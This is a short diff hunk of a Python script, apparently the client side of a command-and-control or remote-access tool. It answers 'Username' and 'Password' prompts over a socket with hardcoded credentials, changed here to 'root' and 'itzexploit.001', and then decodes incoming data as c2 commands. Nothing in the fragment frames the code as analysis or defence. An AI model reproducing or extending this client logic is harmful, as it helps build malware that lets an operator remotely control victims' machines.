@@ -341,9 +341,9 @@ def main():
                     break
                 
                 if b"Username" in data:
-                    s.send(b"glitcham")
+                    s.send(b"root")
                 elif b"Password" in data:
-                    s.send(b"FSOCIETY")
+                    s.send(b"itzexploit.001")
                 else:
                     try:
                         c2 = data.decode().strip()
